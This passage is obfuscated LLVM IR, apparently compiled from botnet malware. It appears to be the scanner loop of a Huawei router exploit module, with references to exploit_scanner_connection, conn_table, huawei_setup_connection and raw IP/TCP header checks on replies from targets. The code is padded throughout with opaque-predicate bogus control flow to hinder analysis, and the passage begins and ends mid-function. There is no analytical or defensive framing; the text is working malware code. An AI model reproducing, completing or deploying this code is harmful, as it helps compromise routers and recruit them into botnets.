  %427 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %428 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %427, i32 0, i32 0
  %429 = load i16, i16* %428, align 4
  %430 = zext i16 %429 to i32
  %431 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %432 = zext i16 %431 to i32
  %433 = icmp ne i32 %430, %432
  br i1 %433, label %434, label %435

; <label>:434:                                    ; preds = %426
  br label %334

; <label>:435:                                    ; preds = %426
  %436 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %437 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %436, i32 0, i32 1
  %438 = load i16, i16* %437, align 2
  %439 = zext i16 %438 to i32
  %440 = load i16, i16* %2, align 2
  %441 = zext i16 %440 to i32
  %442 = icmp ne i32 %439, %441
  br i1 %442, label %443, label %444

; <label>:443:                                    ; preds = %435
  br label %334

; <label>:444:                                    ; preds = %435
  %445 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %446 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %445, i32 0, i32 4
  %447 = load i16, i16* %446, align 4
  %448 = lshr i16 %447, 9
  %449 = and i16 %448, 1
  %450 = icmp ne i16 %449, 0
  br i1 %450, label %452, label %451

; <label>:451:                                    ; preds = %444
  br label %334

; <label>:452:                                    ; preds = %444
  %453 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 4
  %455 = load i16, i16* %454, align 4
  %456 = lshr i16 %455, 12
  %457 = and i16 %456, 1
  %458 = icmp ne i16 %457, 0
  br i1 %458, label %460, label %459

; <label>:459:                                    ; preds = %452
  br label %334

; <label>:460:                                    ; preds = %452
  %461 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %462 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = lshr i16 %463, 10
  %465 = and i16 %464, 1
  %466 = icmp ne i16 %465, 0
  br i1 %466, label %467, label %484

; <label>:467:                                    ; preds = %460
  %468 = load i32, i32* @x.57
  %469 = load i32, i32* @y.58
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %467
  %476 = load i32, i32* @x.57
  %477 = load i32, i32* @y.58
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %334

; <label>:484:                                    ; preds = %460
  %485 = load i32, i32* @x.57
  %486 = load i32, i32* @y.58
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %484
  %493 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %494 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %493, i32 0, i32 4
  %495 = load i16, i16* %494, align 4
  %496 = lshr i16 %495, 8
  %497 = and i16 %496, 1
  %498 = icmp ne i16 %497, 0
  %499 = load i32, i32* @x.57
  %500 = load i32, i32* @y.58
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBBpart2128, label %originalBB124alteredBB

originalBBpart2128:                               ; preds = %originalBB124
  br i1 %498, label %507, label %524

; <label>:507:                                    ; preds = %originalBBpart2128
  %508 = load i32, i32* @x.57
  %509 = load i32, i32* @y.58
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %507
  %516 = load i32, i32* @x.57
  %517 = load i32, i32* @y.58
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %334

; <label>:524:                                    ; preds = %originalBBpart2128
  %525 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %526 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %525, i32 0, i32 3
  %527 = load i32, i32* %526, align 4
  %528 = call i32 @ntohl(i32 %527) #9
  %529 = sub i32 %528, 1
  %530 = call i32 @htonl(i32 %529) #9
  %531 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %532 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %531, i32 0, i32 8
  %533 = load i32, i32* %532, align 4
  %534 = icmp ne i32 %530, %533
  br i1 %534, label %535, label %536

; <label>:535:                                    ; preds = %524
  br label %334

; <label>:536:                                    ; preds = %524
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %537 = load i32, i32* %9, align 4
  store i32 %537, i32* %18, align 4
  br label %538

; <label>:538:                                    ; preds = %556, %536
  %539 = load i32, i32* %18, align 4
  %540 = icmp slt i32 %539, 128
  br i1 %540, label %541, label %559

; <label>:541:                                    ; preds = %538
  %542 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %543 = load i32, i32* %18, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %542, i64 %544
  %546 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %545, i32 0, i32 2
  %547 = load i32, i32* %546, align 8
  %548 = icmp eq i32 %547, 0
  br i1 %548, label %549, label %555

; <label>:549:                                    ; preds = %541
  %550 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %551 = load i32, i32* %18, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %550, i64 %552
  store %struct.exploit_scanner_connection* %553, %struct.exploit_scanner_connection** %22, align 8
  %554 = load i32, i32* %18, align 4
  store i32 %554, i32* %9, align 4
  br label %559

; <label>:555:                                    ; preds = %541
  br label %556

; <label>:556:                                    ; preds = %555
  %557 = load i32, i32* %18, align 4
  %558 = add nsw i32 %557, 1
  store i32 %558, i32* %18, align 4
  br label %538

; <label>:559:                                    ; preds = %549, %538
  %560 = load i32, i32* @x.57
  %561 = load i32, i32* @y.58
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %559
  %568 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %569 = icmp eq %struct.exploit_scanner_connection* %568, null
  %570 = load i32, i32* @x.57
  %571 = load i32, i32* @y.58
  %572 = sub i32 %570, 1
  %573 = mul i32 %570, %572
  %574 = urem i32 %573, 2
  %575 = icmp eq i32 %574, 0
  %576 = icmp slt i32 %571, 10
  %577 = or i1 %575, %576
  br i1 %577, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %569, label %578, label %579

; <label>:578:                                    ; preds = %originalBBpart2136
  br label %607

; <label>:579:                                    ; preds = %originalBBpart2136
  %580 = load i32, i32* @x.57
  %581 = load i32, i32* @y.58
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %579
  %588 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 8
  %590 = load i32, i32* %589, align 4
  %591 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %592 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %591, i32 0, i32 3
  store i32 %590, i32* %592, align 4
  %593 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %594 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %593, i32 0, i32 0
  %595 = load i16, i16* %594, align 4
  %596 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %597 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %596, i32 0, i32 4
  store i16 %595, i16* %597, align 8
  %598 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %598)
  %599 = load i32, i32* @x.57
  %600 = load i32, i32* @y.58
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %334

; <label>:607:                                    ; preds = %578, %390
  %608 = load i32, i32* @x.57
  %609 = load i32, i32* @y.58
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %607
  %616 = load i32, i32* @x.57
  %617 = load i32, i32* @y.58
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br label %624

; <label>:624:                                    ; preds = %originalBBpart2144
  %625 = load i32, i32* @x.57
  %626 = load i32, i32* @y.58
  %627 = sub i32 %625, 1
  %628 = mul i32 %625, %627
  %629 = urem i32 %628, 2
  %630 = icmp eq i32 %629, 0
  %631 = icmp slt i32 %626, 10
  %632 = or i1 %630, %631
  br i1 %632, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %624
  %633 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %634 = getelementptr inbounds [16 x i64], [16 x i64]* %633, i64 0, i64 0
  %635 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %634) #6, !srcloc !3
  %636 = extractvalue { i64, i64* } %635, 0
  %637 = extractvalue { i64, i64* } %635, 1
  %638 = trunc i64 %636 to i32
  store i32 %638, i32* %24, align 4
  %639 = ptrtoint i64* %637 to i64
  %640 = trunc i64 %639 to i32
  store i32 %640, i32* %25, align 4
  %641 = load i32, i32* @x.57
  %642 = load i32, i32* @y.58
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br label %649

; <label>:649:                                    ; preds = %originalBBpart2148
  %650 = load i32, i32* @x.57
  %651 = load i32, i32* @y.58
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %649
  %658 = load i32, i32* @x.57
  %659 = load i32, i32* @y.58
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %666

; <label>:666:                                    ; preds = %originalBBpart2152
  %667 = load i32, i32* @x.57
  %668 = load i32, i32* @y.58
  %669 = sub i32 %667, 1
  %670 = mul i32 %667, %669
  %671 = urem i32 %670, 2
  %672 = icmp eq i32 %671, 0
  %673 = icmp slt i32 %668, 10
  %674 = or i1 %672, %673
  br i1 %674, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %666
  %675 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %676 = getelementptr inbounds [16 x i64], [16 x i64]* %675, i64 0, i64 0
  %677 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %676) #6, !srcloc !4
  %678 = extractvalue { i64, i64* } %677, 0
  %679 = extractvalue { i64, i64* } %677, 1
  %680 = trunc i64 %678 to i32
  store i32 %680, i32* %26, align 4
  %681 = ptrtoint i64* %679 to i64
  %682 = trunc i64 %681 to i32
  store i32 %682, i32* %27, align 4
  %683 = load i32, i32* @x.57
  %684 = load i32, i32* @y.58
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br label %691

; <label>:691:                                    ; preds = %originalBBpart2156
  store i32 0, i32* %1, align 4
  br label %692

; <label>:692:                                    ; preds = %originalBBpart2217, %691
  %693 = load i32, i32* %1, align 4
  %694 = icmp slt i32 %693, 128
  br i1 %694, label %695, label %945

; <label>:695:                                    ; preds = %692
  store i32 5, i32* %28, align 4
  %696 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %697 = load i32, i32* %1, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %696, i64 %698
  store %struct.exploit_scanner_connection* %699, %struct.exploit_scanner_connection** %7, align 8
  %700 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %701 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %700, i32 0, i32 2
  %702 = load i32, i32* %701, align 8
  %703 = icmp ne i32 %702, 0
  br i1 %703, label %704, label %740

; <label>:704:                                    ; preds = %695
  %705 = load i32, i32* @huawei_fake_time, align 4
  %706 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %707 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %706, i32 0, i32 1
  %708 = load i32, i32* %707, align 4
  %709 = sub i32 %705, %708
  %710 = load i32, i32* %28, align 4
  %711 = icmp ugt i32 %709, %710
  br i1 %711, label %712, label %740

; <label>:712:                                    ; preds = %704
  %713 = load i32, i32* @x.57
  %714 = load i32, i32* @y.58
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %712
  %721 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %722 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %721, i32 0, i32 0
  %723 = load i32, i32* %722, align 8
  %724 = call i32 @close(i32 %723)
  %725 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %726 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %725, i32 0, i32 0
  store i32 -1, i32* %726, align 8
  %727 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %728 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %727, i32 0, i32 2
  store i32 0, i32* %728, align 8
  %729 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %730 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %729, i32 0, i32 6
  %731 = getelementptr inbounds [256 x i8], [256 x i8]* %730, i32 0, i32 0
  call void @util_zero(i8* %731, i32 256)
  %732 = load i32, i32* @x.57
  %733 = load i32, i32* @y.58
  %734 = sub i32 %732, 1
  %735 = mul i32 %732, %734
  %736 = urem i32 %735, 2
  %737 = icmp eq i32 %736, 0
  %738 = icmp slt i32 %733, 10
  %739 = or i1 %737, %738
  br i1 %739, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %926

; <label>:740:                                    ; preds = %704, %695
  %741 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %742 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %741, i32 0, i32 2
  %743 = load i32, i32* %742, align 8
  %744 = icmp eq i32 %743, 1
  br i1 %744, label %787, label %745

; <label>:745:                                    ; preds = %740
  %746 = load i32, i32* @x.57
  %747 = load i32, i32* @y.58
  %748 = sub i32 %746, 1
  %749 = mul i32 %746, %748
  %750 = urem i32 %749, 2
  %751 = icmp eq i32 %750, 0
  %752 = icmp slt i32 %747, 10
  %753 = or i1 %751, %752
  br i1 %753, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %745
  %754 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %755 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %754, i32 0, i32 2
  %756 = load i32, i32* %755, align 8
  %757 = icmp eq i32 %756, 3
  %758 = load i32, i32* @x.57
  %759 = load i32, i32* @y.58
  %760 = sub i32 %758, 1
  %761 = mul i32 %758, %760
  %762 = urem i32 %761, 2
  %763 = icmp eq i32 %762, 0
  %764 = icmp slt i32 %759, 10
  %765 = or i1 %763, %764
  br i1 %765, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br i1 %757, label %787, label %766

; <label>:766:                                    ; preds = %originalBBpart2164
  %767 = load i32, i32* @x.57
  %768 = load i32, i32* @y.58
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %766
  %775 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %776 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %775, i32 0, i32 2
  %777 = load i32, i32* %776, align 8
  %778 = icmp eq i32 %777, 4
  %779 = load i32, i32* @x.57
  %780 = load i32, i32* @y.58
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br i1 %778, label %787, label %829

; <label>:787:                                    ; preds = %originalBBpart2168, %originalBBpart2164, %740
  %788 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %789 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %788, i32 0, i32 0
  %790 = load i32, i32* %789, align 8
  %791 = srem i32 %790, 64
  %792 = zext i32 %791 to i64
  %793 = shl i64 1, %792
  %794 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %795 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %796 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %795, i32 0, i32 0
  %797 = load i32, i32* %796, align 8
  %798 = sdiv i32 %797, 64
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds [16 x i64], [16 x i64]* %794, i64 0, i64 %799
  %801 = load i64, i64* %800, align 8
  %802 = or i64 %801, %793
  store i64 %802, i64* %800, align 8
  %803 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %804 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %803, i32 0, i32 0
  %805 = load i32, i32* %804, align 8
  %806 = load i32, i32* %12, align 4
  %807 = icmp sgt i32 %805, %806
  br i1 %807, label %808, label %828

; <label>:808:                                    ; preds = %787
  %809 = load i32, i32* @x.57
  %810 = load i32, i32* @y.58
  %811 = sub i32 %809, 1
  %812 = mul i32 %809, %811
  %813 = urem i32 %812, 2
  %814 = icmp eq i32 %813, 0
  %815 = icmp slt i32 %810, 10
  %816 = or i1 %814, %815
  br i1 %816, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %808
  %817 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %818 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %817, i32 0, i32 0
  %819 = load i32, i32* %818, align 8
  store i32 %819, i32* %12, align 4
  %820 = load i32, i32* @x.57
  %821 = load i32, i32* @y.58
  %822 = sub i32 %820, 1
  %823 = mul i32 %820, %822
  %824 = urem i32 %823, 2
  %825 = icmp eq i32 %824, 0
  %826 = icmp slt i32 %821, 10
  %827 = or i1 %825, %826
  br i1 %827, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %828

; <label>:828:                                    ; preds = %originalBBpart2172, %787
  br label %925

; <label>:829:                                    ; preds = %originalBBpart2168
  %830 = load i32, i32* @x.57
  %831 = load i32, i32* @y.58
  %832 = sub i32 %830, 1
  %833 = mul i32 %830, %832
  %834 = urem i32 %833, 2
  %835 = icmp eq i32 %834, 0
  %836 = icmp slt i32 %831, 10
  %837 = or i1 %835, %836
  br i1 %837, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %829
  %838 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %839 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %838, i32 0, i32 2
  %840 = load i32, i32* %839, align 8
  %841 = icmp ne i32 %840, 0
  %842 = load i32, i32* @x.57
  %843 = load i32, i32* @y.58
  %844 = sub i32 %842, 1
  %845 = mul i32 %842, %844
  %846 = urem i32 %845, 2
  %847 = icmp eq i32 %846, 0
  %848 = icmp slt i32 %843, 10
  %849 = or i1 %847, %848
  br i1 %849, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %841, label %850, label %908

; <label>:850:                                    ; preds = %originalBBpart2176
  %851 = load i32, i32* @x.57
  %852 = load i32, i32* @y.58
  %853 = sub i32 %851, 1
  %854 = mul i32 %851, %853
  %855 = urem i32 %854, 2
  %856 = icmp eq i32 %855, 0
  %857 = icmp slt i32 %852, 10
  %858 = or i1 %856, %857
  br i1 %858, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %850
  %859 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %860 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %859, i32 0, i32 0
  %861 = load i32, i32* %860, align 8
  %862 = srem i32 %861, 64
  %863 = zext i32 %862 to i64
  %864 = shl i64 1, %863
  %865 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %866 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %867 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %866, i32 0, i32 0
  %868 = load i32, i32* %867, align 8
  %869 = sdiv i32 %868, 64
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds [16 x i64], [16 x i64]* %865, i64 0, i64 %870
  %872 = load i64, i64* %871, align 8
  %873 = or i64 %872, %864
  store i64 %873, i64* %871, align 8
  %874 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %875 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %874, i32 0, i32 0
  %876 = load i32, i32* %875, align 8
  %877 = load i32, i32* %11, align 4
  %878 = icmp sgt i32 %876, %877
  %879 = load i32, i32* @x.57
  %880 = load i32, i32* @y.58
  %881 = sub i32 %879, 1
  %882 = mul i32 %879, %881
  %883 = urem i32 %882, 2
  %884 = icmp eq i32 %883, 0
  %885 = icmp slt i32 %880, 10
  %886 = or i1 %884, %885
  br i1 %886, label %originalBBpart2202, label %originalBB178alteredBB

originalBBpart2202:                               ; preds = %originalBB178
  br i1 %878, label %887, label %907

; <label>:887:                                    ; preds = %originalBBpart2202
  %888 = load i32, i32* @x.57
  %889 = load i32, i32* @y.58
  %890 = sub i32 %888, 1
  %891 = mul i32 %888, %890
  %892 = urem i32 %891, 2
  %893 = icmp eq i32 %892, 0
  %894 = icmp slt i32 %889, 10
  %895 = or i1 %893, %894
  br i1 %895, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %887
  %896 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %897 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %896, i32 0, i32 0
  %898 = load i32, i32* %897, align 8
  store i32 %898, i32* %11, align 4
  %899 = load i32, i32* @x.57
  %900 = load i32, i32* @y.58
  %901 = sub i32 %899, 1
  %902 = mul i32 %899, %901
  %903 = urem i32 %902, 2
  %904 = icmp eq i32 %903, 0
  %905 = icmp slt i32 %900, 10
  %906 = or i1 %904, %905
  br i1 %906, label %originalBBpart2206, label %originalBB204alteredBB

originalBBpart2206:                               ; preds = %originalBB204
  br label %907

; <label>:907:                                    ; preds = %originalBBpart2206, %originalBBpart2202
  br label %908

; <label>:908:                                    ; preds = %907, %originalBBpart2176
  %909 = load i32, i32* @x.57
  %910 = load i32, i32* @y.58
  %911 = sub i32 %909, 1
  %912 = mul i32 %909, %911
  %913 = urem i32 %912, 2
  %914 = icmp eq i32 %913, 0
  %915 = icmp slt i32 %910, 10
  %916 = or i1 %914, %915
  br i1 %916, label %originalBB208, label %originalBB208alteredBB

originalBB208:                                    ; preds = %originalBB208alteredBB, %908
  %917 = load i32, i32* @x.57
  %918 = load i32, i32* @y.58
  %919 = sub i32 %917, 1
  %920 = mul i32 %917, %919
  %921 = urem i32 %920, 2
  %922 = icmp eq i32 %921, 0
  %923 = icmp slt i32 %918, 10
  %924 = or i1 %922, %923
  br i1 %924, label %originalBBpart2210, label %originalBB208alteredBB

originalBBpart2210:                               ; preds = %originalBB208
  br label %925

; <label>:925:                                    ; preds = %originalBBpart2210, %828
  br label %926

; <label>:926:                                    ; preds = %925, %originalBBpart2160
  %927 = load i32, i32* @x.57
  %928 = load i32, i32* @y.58
  %929 = sub i32 %927, 1
  %930 = mul i32 %927, %929
  %931 = urem i32 %930, 2
  %932 = icmp eq i32 %931, 0
  %933 = icmp slt i32 %928, 10
  %934 = or i1 %932, %933
  br i1 %934, label %originalBB212, label %originalBB212alteredBB

originalBB212:                                    ; preds = %originalBB212alteredBB, %926
  %935 = load i32, i32* %1, align 4
  %936 = add nsw i32 %935, 1
  store i32 %936, i32* %1, align 4
  %937 = load i32, i32* @x.57
  %938 = load i32, i32* @y.58
  %939 = sub i32 %937, 1
  %940 = mul i32 %937, %939
  %941 = urem i32 %940, 2
  %942 = icmp eq i32 %941, 0
  %943 = icmp slt i32 %938, 10
  %944 = or i1 %942, %943
  br i1 %944, label %originalBBpart2217, label %originalBB212alteredBB

originalBBpart2217:                               ; preds = %originalBB212
  br label %692

; <label>:945:                                    ; preds = %692
  %946 = load i32, i32* @x.57
  %947 = load i32, i32* @y.58
  %948 = sub i32 %946, 1
  %949 = mul i32 %946, %948
  %950 = urem i32 %949, 2
  %951 = icmp eq i32 %950, 0
  %952 = icmp slt i32 %947, 10
  %953 = or i1 %951, %952
  br i1 %953, label %originalBB219, label %originalBB219alteredBB

originalBB219:                                    ; preds = %originalBB219alteredBB, %945
  %954 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %954, align 8
  %955 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %955, align 8
